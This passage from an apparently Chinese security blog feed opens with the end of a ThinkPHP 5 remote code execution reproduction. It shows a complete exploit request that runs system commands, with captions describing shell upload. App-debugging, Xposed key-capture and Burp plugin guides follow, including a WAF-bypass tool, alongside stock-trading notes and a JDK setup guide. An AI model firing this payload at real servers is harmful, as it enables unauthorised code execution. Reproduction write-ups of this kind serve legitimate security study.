<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8080</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 72</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012155854569.png" alt="image-20201012155854569"></p>
<p>写入shell</p>
<p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201028092150996.png" alt="image-20201028092150996"></p>
<p>连接成功</p>
<p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201028092243638.png" alt="image-20201028092243638"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_36711453/article/details/84977739" target="_blank" rel="noopener">https://blog.csdn.net/qq_36711453/article/details/84977739</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>跟叔投资逻辑总结（雪球部分）草稿，不断更新中</title>
    <url>/2020/10/10/%E8%B7%9F%E5%8F%94%E6%8A%95%E8%B5%84%E9%80%BB%E8%BE%91%E6%80%BB%E7%BB%93%EF%BC%88%E9%9B%AA%E7%90%83%E9%83%A8%E5%88%86%EF%BC%89/</url>
    <content><![CDATA[<h2 id="跟叔投资逻辑总结"><a href="#跟叔投资逻辑总结" class="headerlink" title="跟叔投资逻辑总结"></a>跟叔投资逻辑总结</h2><h3 id="坚持"><a href="#坚持" class="headerlink" title="坚持"></a>坚持</h3><p>2015年牛市中坚持乐视网，因为贾跃亭减持，不是不看好，而是牛市中时间宝贵</p><h3 id="股市和女人关系"><a href="#股市和女人关系" class="headerlink" title="股市和女人关系"></a>股市和女人关系</h3><p>这里我来八一八创业板和女人的关系，<br> 创业板分 4 类。 第一类:既有业绩，又有故事。优秀的代表，乐视网，碧生源。 第二类:光有业绩，没有故事。优秀代表，网宿科技，大富科技。 第三类:没有业绩，光有故事。优秀代表，千山药机。 第四类:即无业绩，也无故事。优秀代表，湘鄂情，星辉车模。 对应的 4 中女人。 1:即有脸蛋，又有智慧。优秀代表，奶茶妹妹。 2:光有脸蛋，没有智慧。优秀代表，天仙妹妹。 3:没有脸蛋，光有智慧。优秀代表，邓文迪。 4:即无脸蛋，又无智慧。优秀代表，凤姐。不是凤爪</p><a id="more"></a>

<p>从财富估值的角度来说，第一类股票和女人估值最高，乐视，碧生源，奶茶(背后的资产刘 强东)。这样的高估值会一直存在。大家想想看，乐视业绩一直不错，故事又非常多，而且 每一个故事都很成功。奶茶亦然，人长得漂亮，又保送清华，交换生哥大。是刚才例子里估值最高的女人。且是市场反复炒作的对象(乐视网上市 4 年，年年被市场反复炒作，碧生源亦然。奶茶也是媒体反复炒作的对象。</p>
<p>第二类股票和女人只能享受比较一般的的估值。网速科技，大富科技按照创业板平均估值来 看，他们 40 倍不到，显然估值偏低。他们由于纯靠业绩，几乎没有什么故事，所以一旦业 绩不行了。哈哈，就会如天仙妹妹一样从人们的视线中消失。当年的中兴通讯，中集集团无不是此类。</p>
<p>第三类股票和女人在被炒作某一阶段，享受的估值高的离谱，如千山药机，就像邓文迪一样。 且只要有故事，会被反复炒作。所以邓文迪也被媒体炒作多年，一直到千山没有故事啦，庄 家撤里，千山就没有任何价值啦。邓文迪被默克多这个庄家撤离后，显然，媒体关注度大降。</p>
<p>第四类股票和女人，股票靠收购或重组，女人靠整容，否则无法享受高估值。显然湘鄂情改 名中科云网后遭到爆炒，柳岩和就是改名后的中科云网，而悲惨的凤姐由于本身质地太差，整容重组有难度，现在还享受着没有改名以前湘鄂情的估值。创业板如女人，炒中国股市只能炒创业板，物以稀为贵。最后链接一篇我已经的文章关于创</p>
<p>业板的 <a href="http://xueqiu.com/8255849716/30330728" target="_blank" rel="noopener">http://xueqiu.com/8255849716/30330728</a></p>
<h3 id="中美两国的不同国情下不同的估值体系"><a href="#中美两国的不同国情下不同的估值体系" class="headerlink" title="中美两国的不同国情下不同的估值体系"></a>中美两国的不同国情下不同的估值体系</h3><p>成长 20%算是超级成长股吗。在美国是，在中国不是，因为美国的 gdp 的增长一年才 2% 左右。中国 10%左右。再加上中国的通货膨胀太吓人啦，所以中国的超级成长股至少一年50%以上增长才有效。</p>
<p>巴菲特买入的可口可乐在市值已经很大的情况下又赚了几十倍，这个情况在中国也不适用。 目前来看中国诞生可口可乐这样的消费股是完全没有任何可能。全世界都崇拜美国，在美国 的文化影响下，可口可乐的市场是全世界。任何一个美国消费股的市场都是全世界，如星巴克，麦当劳，高露洁等等。伊利，王老吉，茅台，云南白药的市场只有中国。只有一国的文化足够强大到影响全世界时，他的产品才会被全世界消费者认可。如最近几年的韩国文化对全世界的影响，才让三星这么垃圾的手机在全世界的销量超过苹果。</p>
<h3 id="辉煌的-2010"><a href="#辉煌的-2010" class="headerlink" title="辉煌的 2010"></a>辉煌的 2010</h3><p>后来总结出规律，只要是主营业务是往 官员嘴里送的股票都是牛股，如茅台，五粮液，泸州老窖，獐子岛(因为这些东西越涨价越 能体现官员和贱民的身份差距)，所以胡温时代的奢侈消费品股票是不可多得的好标的。接 下来 7 月上市的一个主营业务海参苗的公司壹桥苗业，就是我的攻击目标啦。买的不多 20多万但是短短一个半月盈利了 35 万。怎么也没想到庄家那么疯狂。</p>
<p>我喜欢在历史的牛股里寻找未来牛股的影子，无意中又发现东方园林上市以后半年涨了 4 倍。而且发现它的业绩一直很好，增长稳定且年年 100%的超超级成长股。后来专门找了一 个市政公用局的一个处长了解了一下 ，拿园林合同不难，每年各个城市的园林绿化投入都 很大，做园林的技术含量也不高，公司非常多，但是中标以后，必须垫资进场。他说比如说 10 个亿的标大概要垫 3 个亿才能开工。天哪，园林上市以后圈了 10 几亿，自然有钱垫资啦， 棕榈园林上市之前，每年的合同才几个亿。难怪园林上市公司当年及第二年业绩都非常好。 到了第三年都要增发，因为第三年又没钱垫啦。ok。棕榈园林，就是他啦。这个票受了点折磨，原来只打算买 20 万的，后来回调后补了 20 万，翻翻后走人。3 个月赚了 45 万。没有请那个处长吃饭，我是绝对不敢在底位补仓的。</p>
<p>我在年初跳槽到了一家做 sp 的中小公司，当江苏的老大，6 月份我的一个助理遭遇恋爱婚 姻危机，一天我加完班，他请我吃饭说到下半年国庆节结婚的烦恼，说现在的女友看中通灵 翠钻的一款翡翠玉镯，和几年前的一个女友看中的是一模一样，一个货号，当时买给前女友 时大概 7000 多一对，4 年前的事，现在居然要 5 万多，涨了 7 倍啊。饭后回家，我又百度 了玉的情况，发现 2000 年到 2010 年玉居然涨了 50 多倍。百度了一下，发现主营玉的上 市公司居然有，是东方金钰，居然还没怎么涨 ，第二天，我问我的助理，你还有多少钱准 备结婚，他说接近 30 万，你炒股吗，他不炒，我让他开个账户，买入东方金钰。在 10 月 份之前，这个 30 万能够挣到 6 万不就有买玉镯的钱了吗。当然，这种票我没买。因为当时 持有莱宝高科。壹桥苗业。科大讯飞，棕榈园林。后来从我推荐的位臵涨了 200%，他也没买，有点遗憾。</p>
<h3 id="投资理念"><a href="#投资理念" class="headerlink" title="投资理念"></a>投资理念</h3><p>买股票一看未来，二用逻辑进行推理</p>
<h3 id="影响最大的书"><a href="#影响最大的书" class="headerlink" title="影响最大的书"></a>影响最大的书</h3><p>1.马克思的政治经济学。里面的关于供求关系的论述是我领悟最深的。这也是我重来不碰银</p>
<p>行股的原因。</p>
<p>2.纳什的博弈论，及所有博弈论相关的书籍。</p>
<p>宏观上从中体会到股市和经济的博弈，股市和国家资金政策的博弈。次宏观上体会股市里的主板和中小板，创业板的博弈，蓝筹和概念的博弈，庄家和散户的博弈。微观上体会个股自己股价和业绩的博弈，股价和题材故事的博弈。</p>
<p>3.马克思主义哲学，学习他的螺旋式上升，否定之否定。从中体会坚定持股的信心。</p>
<p>4.大数据，让我彻底从一个移动互联网盲变成一个可以在 it 人面前侃侃而谈。从中挖掘很多大牛股。</p>
<p>5.比尔盖次的，未来之路。体会他对未来科技精准的预判。提供了我喜欢瞎想的优秀炒股品格。</p>
<p>6.可以说唯一和大师有关对我炒股有影响的书就是彼得林奇的如何寻找超级成长股。但仅仅从 中领悟了一定要做成长股。至于书中的内容，大部分都没有借鉴价值。因为时代不同啦。他那个时代的什么连锁酒店之类的大牛股和现在移动互联网科技时代比，简直弱爆了。</p>
]]></content>
  </entry>
  <entry>
    <title>Mac安装JDK双版本</title>
    <url>/2020/10/09/Mac%E5%AE%89%E8%A3%85JDK%E5%8F%8C%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<p>cd /Library/Java/JavaVirtualMachines/</p><p><img src="//choge.top/2020/10/09/Mac安装JDK双版本/image-20201009164159130.png" alt="image-20201009164159130"></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">$ vim ~/.bash_profile</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加下面的代码</span></span><br><span class="line"><span class="comment">#JDK切换	</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">JAVA_8_HOME</span>=/Library/Java/JavaVirtualMachines/jdk1.8.0_144.jdk/Contents/Home</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">JAVA_13_HOME</span>=/Library/Java/JavaVirtualMachines/jdk-13.jdk/Contents/Home</span><br><span class="line">alias <span class="attribute">jdk8</span>=<span class="string">'export JAVA_HOME=$JAVA_8_HOME'</span></span><br><span class="line">alias <span class="attribute">jdk13</span>=<span class="string">'export JAVA_HOME=$JAVA_13_HOME'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#保存退出</span></span><br><span class="line"><span class="comment">#激活环境变量</span></span><br><span class="line">$ source ~/.bash_profile</span><br></pre></td></tr></table></figure><a id="more"></a>



<p><img src="//choge.top/2020/10/09/Mac安装JDK双版本/image-20201009164728569.png" alt="image-20201009164728569"></p>
]]></content>
  </entry>
  <entry>
    <title>app测试之动态调试</title>
    <url>/2020/09/29/app%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<p>本文主要介绍IDEA，JEB，Eclipse进行app动态调试</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>安装apktool，如果apktool要使用-d参数将app反编译为java代码，则要使用apktool_2.0.3及之前版本</p><p>反编译apk<code>java -jar apktool.jar d xxx.apk</code></p><p>IDEA安装Smali插件</p><p><a href="https://bitbucket.org/JesusFreke/smali/downloads/" target="_blank" rel="noopener">https://bitbucket.org/JesusFreke/smali/downloads/</a></p><a id="more"></a>




<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20200929151519251.png" alt="image-20200929151519251"></p>
<p>重启</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20200929151621532.png" alt="image-20200929151621532"></p>
<p>这里有个天坑，安装完Smali插件后需要做一些配置，不然还是无法调试，配置如下两图</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201005132619027.png" alt="image-20201005132619027"></p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201005132850789.png" alt="image-20201005132850789"></p>
<p>反编译apk</p>
<p><code>java -jar apktool.jar d xxx.apk</code></p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007163417440.png" alt></p>
<p>反编译后AndroidManifest.xml中修改<code>debuggable=&quot;true&quot;</code></p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007163714272.png" alt="image-20201007163714272"></p>
<p>在入口处添加waitForDebugger代码进行调试等待</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007163913213.png" alt="image-20201007163913213"></p>
<p>找到入口Activity之后，我们直接在他的onCreate方法的第一行加上waitForDebugger代码即可，找到对应的MainActivity的smali源码：</p>
<p>然后添加一行代码：<code>invoke-static {}, Landroid/os/Debug;-&gt;waitForDebugger()V</code>，这个是smali语法的，其实对应的Java代码就是：<code>android.os.Debug.waitForDebugger()</code></p>
<p>启动app进入等待调试</p>
<p><code>adb shell am start -D -n 包名/入口名</code>如果.MainActivity前面的是包名，此处可以把钱吗的包名称省略，当然此处也可以省略前面的包名，直接一个.MainActivity</p>
<p>adb shell am start -D -n hfdcxy.com.myapplication/hfdcxy.com.myapplication.MainActivity</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007164204736.png" alt="image-20201007164204736"></p>
<h3 id="JEB动态调试"><a href="#JEB动态调试" class="headerlink" title="JEB动态调试"></a>JEB动态调试</h3><p>jeb下载与使用参考以下链接</p>
<p><a href="https://blog.csdn.net/JEROME__S/article/details/105458589" target="_blank" rel="noopener">https://blog.csdn.net/JEROME__S/article/details/105458589</a></p>
<p><a href="https://blog.csdn.net/ASSYIRAN/article/details/80534112" target="_blank" rel="noopener">https://blog.csdn.net/ASSYIRAN/article/details/80534112</a></p>
<p>直接将app拖入到jeb后选择需要的地方ctrl+b打断点</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007190242458.png" alt="image-20201007190242458"></p>
<p>手机选择app进入调试等待或者输入以下命令</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">adb shell am start -D -n hfdcxy<span class="selector-class">.com</span><span class="selector-class">.myapplication</span>/hfdcxy<span class="selector-class">.com</span><span class="selector-class">.myapplication</span><span class="selector-class">.MainActivity</span></span><br></pre></td></tr></table></figure>

<p>点击虫子图标选择要调试的应用进行调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007191218025.png" alt="image-20201007191218025"></p>
<p>app上输入数据后可以在jeb上看到输入的数据进行调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007190919303.png" alt="image-20201007190919303"></p>
<h3 id="IDEA动态调试"><a href="#IDEA动态调试" class="headerlink" title="IDEA动态调试"></a>IDEA动态调试</h3><h5 id="IDEA动态调试Java代码"><a href="#IDEA动态调试Java代码" class="headerlink" title="IDEA动态调试Java代码"></a>IDEA动态调试Java代码</h5><p>反编译时将Smali转换成Java代码加<code>-d</code>参数可以反编译为java代码，但是apktool需要选择</p>
<p>反编译apk<code>java -jar apktool.jar d -d xxx.apk</code></p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007213733932.png" alt="image-20201007213733932"></p>
<p>打开ddms，注意新款Android studio的ddms需要用老版本的Java才能打开，使用jdk-8u144，打开ddms路径在/Users/用户名/Library/Android/sdk下启动终端<code>sudo ./monitor</code>打开</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201008194759076.png" alt="image-20201008194759076"></p>
<p>新建一个java项目</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009110348936.png" alt="image-20201009110348936"></p>
<p>新建一个Java项目，把反编译出来的把Smali文件夹中的Java代码文件复制到新建java项目中的src文件夹中去</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009111000799.png" alt="image-20201009111000799"></p>
<p>进入如下功能点，填入对应端口号</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009111724308.png" alt="image-20201009111724308"></p>
<p>点击下图位置，可进行调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009112023359.png" alt="image-20201009112023359"></p>
<p>此时查看ddms，小虫子变绿，调试已通</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009112044152.png" alt="image-20201009112044152"></p>
<p>下断点后进行调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009112132446.png" alt="image-20201009112132446"></p>
<p>手机app输入数据后可在IDEA进行展示</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009112227020.png" alt="image-20201009112227020"></p>
<h5 id="IDEA动态调试Smali"><a href="#IDEA动态调试Smali" class="headerlink" title="IDEA动态调试Smali"></a>IDEA动态调试Smali</h5><p>将app反编译的文件夹导入到IDEA作为一个项目</p>
<p>当环境正确，手机正确连接IDEA时，IDEA会显示手机型号</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009113551522.png" alt="image-20201009113551522"></p>
<p>app进入调试等待模式，点击IDEA如下图位置，会显示等待调试的应用，这样说明手机正确连接，app可以进行调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009113656312.png" alt="image-20201009113656312"></p>
<p>点击如下进行配置</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009113823017.png" alt="image-20201009113823017"></p>
<p>配置如下左侧新建一个Remote，端口可以先随便填写，手机与IDEA正确连接后再开启ddms会有冲突，所以此处可能不知道调试端口号，就可以随便填写</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009114034258.png" alt="image-20201009114034258"></p>
<p>smali代码下断点</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009142739723.png" alt="image-20201009142739723"></p>
<p>手机打开动态调试应用等待调试，按下图位置进行调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009142803266.png" alt="image-20201009142803266"></p>
<p>发现无法连接端口号，无法调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009142931173.png" alt="image-20201009142931173"></p>
<p>此点击右侧小虫子加箭头图标，选中调试应用进行调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009143002217.png" alt="image-20201009143002217"></p>
<p>调试连接成功，端口号为8600</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009143137806.png" alt="image-20201009143137806"></p>
<p>手机输入数据，IDEA可以正确调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009143040470.png" alt="image-20201009143040470"></p>
<p>此时可以修改端口号</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009143206168.png" alt="image-20201009143206168"></p>
<p>再点击小虫子图标，也可以正确调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009143257984.png" alt="image-20201009143257984"></p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>网上有些文章会多一些配置，如下，作为参考，实际测试中图一会自动配置，图二操作可以不进行</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009113953313.png" alt="image-20201009113953313"></p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009113746367.png" alt="image-20201009113746367"></p>
<h3 id="Eclipse动态调试java（不推荐）"><a href="#Eclipse动态调试java（不推荐）" class="headerlink" title="Eclipse动态调试java（不推荐）"></a>Eclipse动态调试java（不推荐）</h3><p>反编译时将Smali转换成Java代码加<code>-d</code>参数可以反编译为java代码，但是apktool需要选择</p>
<p>反编译apk<code>java -jar apktool.jar d -d xxx.apk -o out</code></p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201007213733932.png" alt="image-20201007213733932"></p>
<p>创建一个新的Java项目，Location使用反编译的out目录</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104015084.png" alt="image-20201009104015084"></p>
<p>打开ddms，/Users/用户名/Library/Android/sdk下启动终端<code>sudo ./monitor</code>打开，同时使应用等待调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104245721.png" alt="image-20201009104245721"></p>
<p>进行配置</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104306243.png" alt="image-20201009104306243"></p>
<p>新建一个Remote Java Application，端口选择ddms中显示的8600，然后点击Debug</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104410238.png" alt="image-20201009104410238"></p>
<p>此时小虫子变绿，说明调试成功</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104643668.png" alt="image-20201009104643668"></p>
<p>下合适的断点</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009104716033.png" alt="image-20201009104716033"></p>
<p>调出Debug模式</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009105023750.png" alt="image-20201009105023750"></p>
<p>点击右侧小虫子，手机上输入数据，eclipse可获取变量值进行调试</p>
<p><img src="//choge.top/2020/09/29/app测试之动态调试/image-20201009105213900.png" alt="image-20201009105213900"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/binbin594738977/article/details/106571844/" target="_blank" rel="noopener">新版IDEA或者AndroidStudio不能调试smali工程的问题</a></p>
<p><a href="https://blog.csdn.net/binbin594738977/article/details/106571844/" target="_blank" rel="noopener">https://blog.csdn.net/binbin594738977/article/details/106571844/</a></p>
<p>IDEA调试java</p>
<p><a href="https://www.cnblogs.com/axiong/p/5939762.html" target="_blank" rel="noopener">https://www.cnblogs.com/axiong/p/5939762.html</a></p>
<p>动态调试条件</p>
<p><a href="https://blog.csdn.net/qq_38851536/article/details/100026480" target="_blank" rel="noopener">https://blog.csdn.net/qq_38851536/article/details/100026480</a></p>
<p>加等待代码</p>
<p><a href="https://blog.csdn.net/zhangmiaoping23/article/details/51824728" target="_blank" rel="noopener">https://blog.csdn.net/zhangmiaoping23/article/details/51824728</a> </p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>app</tag>
      </tags>
  </entry>
  <entry>
    <title>app测试之通过Xposed抓取秘钥</title>
    <url>/2020/09/27/app%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%80%9A%E8%BF%87Xposed%E6%8A%93%E5%8F%96%E7%A7%98%E9%92%A5/</url>
    <content><![CDATA[<p>本文主要讲解Inspeckage的基本使用</p><p>安装Xposed等参考本博刷机篇，由于为mac机器，如果要使用mumu模拟器，先要关闭22471端口防止出错，22471是mumu给出的Mac 端口号，关闭命令<code>sudo lsof -i:22471</code></p><h4 id="连接mumu模拟器"><a href="#连接mumu模拟器" class="headerlink" title="连接mumu模拟器"></a>连接mumu模拟器</h4><p><code>sudo adb connect localhost:22471</code></p><a id="more"></a>


<p>如果设备提示offline，执行以下命令</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">adb <span class="keyword">kill</span>-<span class="keyword">server</span></span><br><span class="line">adb <span class="keyword">start</span>-<span class="keyword">server</span></span><br><span class="line">adb devices</span><br></pre></td></tr></table></figure>

<h4 id="连接Inspeckage"><a href="#连接Inspeckage" class="headerlink" title="连接Inspeckage"></a>连接Inspeckage</h4><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">adb</span> <span class="selector-tag">-s</span> <span class="selector-tag">forward</span> <span class="selector-tag">tcp</span><span class="selector-pseudo">:8008</span> <span class="selector-tag">tcp</span><span class="selector-pseudo">:8008</span> (-s为指定设备，可以先使用 adb devices 查看设备 )</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/09/27/app测试之通过Xposed抓取秘钥/image-20200927144525169.png" alt="image-20200927144525169"></p>
<p>选择app</p>
<p><img src="//choge.top/2020/09/27/app测试之通过Xposed抓取秘钥/image-20200927144620887.png" alt="image-20200927144620887"></p>
<p>打开网页 127.0.0.1:8008，查看密钥</p>
<p><img src="//choge.top/2020/09/27/app测试之通过Xposed抓取秘钥/image-20200927144656347.png" alt="image-20200927144656347"></p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>使用真机不需要做转发，手机和电脑连接同一wifi，浏览器输入软件展示的ip地址</p>
<h4 id="Inspeckage命令"><a href="#Inspeckage命令" class="headerlink" title="Inspeckage命令"></a>Inspeckage命令</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Logcat                               查看该app的logcat输出</span><br><span class="line">Tree View                         浏览app的数据目录并直接下载文件到本地</span><br><span class="line">Package Information     应用基本信息（组件信息、权限信息、共享库信息）</span><br><span class="line">Shared Preferences       LOG：app XML文件读写记录；Files：具体XML写入内容</span><br><span class="line">Serialization                      反序列化记录</span><br><span class="line">Crypto                               常见加解密记录（KEY、IV值）</span><br><span class="line">Hash                                 常见的哈希算法记录</span><br><span class="line">SQLite                               SQLite数据库操作记录</span><br><span class="line">HTTP                                 HTTP网络请求记录</span><br><span class="line">File<span class="built_in"> System </span>                      文件读写记录</span><br><span class="line">Misc.                                  调用Clipboard,URL.Parse()记录</span><br><span class="line">WebView                          调用webview内容                  </span><br><span class="line">IPC                                     进程之间通信记录</span><br><span class="line">+Hooks                             运行过程中用户自定义Hook记录</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>app</tag>
      </tags>
  </entry>
  <entry>
    <title>BurpSuite常用插件使用</title>
    <url>/2020/09/04/BurpSuite%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>本文主要收集和使用Burpsuite常用插件及使用方法</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>安装phantomjs</p><p><a href="https://phantomjs.org/download.html" target="_blank" rel="noopener">https://phantomjs.org/download.html</a></p><p>安装jython</p><p><a href="https://www.jython.org/download" target="_blank" rel="noopener">https://www.jython.org/download</a></p><p>安装jruby</p><p><a href="https://www.jruby.org/download" target="_blank" rel="noopener">https://www.jruby.org/download</a></p><a id="more"></a>






<h3 id="Burpsuite插件"><a href="#Burpsuite插件" class="headerlink" title="Burpsuite插件"></a>Burpsuite插件</h3><h4 id="sqlmap4burp"><a href="#sqlmap4burp" class="headerlink" title="sqlmap4burp++"></a>sqlmap4burp++</h4><p>项目地址：<a href="https://github.com/c0ny1/sqlmap4burp-plus-plus" target="_blank" rel="noopener">https://github.com/c0ny1/sqlmap4burp-plus-plus</a></p>
<p>配置好sqlmap路径，Sqlmap option为要实现的命令</p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200916195735371.png" alt="image-20200916195735371"></p>
<h4 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h4><p>主要是用来绕过waf</p>
<p>项目地址：<a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">https://github.com/c0ny1/chunked-coding-converter</a></p>
<p>使用如下</p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200918154848871.png" alt="image-20200918154848871"></p>
<h4 id="gzip解码"><a href="#gzip解码" class="headerlink" title="gzip解码"></a>gzip解码</h4><p>部分数据为gizp的是时候使用插件能自动解码，但有时候并不会解码</p>
<p>项目地址：<a href="https://github.com/portswigger/decompressor" target="_blank" rel="noopener">https://github.com/portswigger/decompressor</a>  </p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200920130827186.png" alt="image-20200920130827186"></p>
<h4 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h4><p>Hackbar无需多说</p>
<p>项目地址：<a href="https://github.com/d3vilbug/HackBar" target="_blank" rel="noopener">https://github.com/d3vilbug/HackBar</a></p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200921105455894.png" alt="image-20200921105455894"></p>
<p>但有Knife v1.6版本中的Hackbar会有更多功能</p>
<p>项目地址：<a href="https://github.com/bit4woo/knife" target="_blank" rel="noopener">https://github.com/bit4woo/knife</a></p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20201026140320931.png" alt="image-20201026140320931"></p>
<h4 id="BurpJSLinkFinder"><a href="#BurpJSLinkFinder" class="headerlink" title="BurpJSLinkFinder"></a>BurpJSLinkFinder</h4><p>自动查找js中的连接</p>
<p>项目地址：<a href="https://github.com/InitRoot/BurpJSLinkFinder.git" target="_blank" rel="noopener">https://github.com/InitRoot/BurpJSLinkFinder.git</a></p>
<p><img src="//choge.top/2020/09/04/BurpSuite常用插件使用/image-20200920151402446.png" alt="image-20200920151402446"></p>
<h4 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h4><p><a href="https://github.com/federicodotta/Java-Deserialization-Scanner" target="_blank" rel="noopener">https://github.com/federicodotta/Java-Deserialization-Scanner</a></p>
<p>使用教程如下</p>
<p><a href="https://www.cnblogs.com/yh-ma/p/10299289.html" target="_blank" rel="noopener">https://www.cnblogs.com/yh-ma/p/10299289.html</a></p>
<h4 id="Brida"><a href="#Brida" class="headerlink" title="Brida"></a>Brida</h4><p><a href="https://blog.csdn.net/weixin_39190897/article/details/102691898" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39190897/article/details/102691898</a></p>
<p>####Software Vulnerability Scanner</p>
<p>漏洞通过Vulnerability展示扫描结果</p>
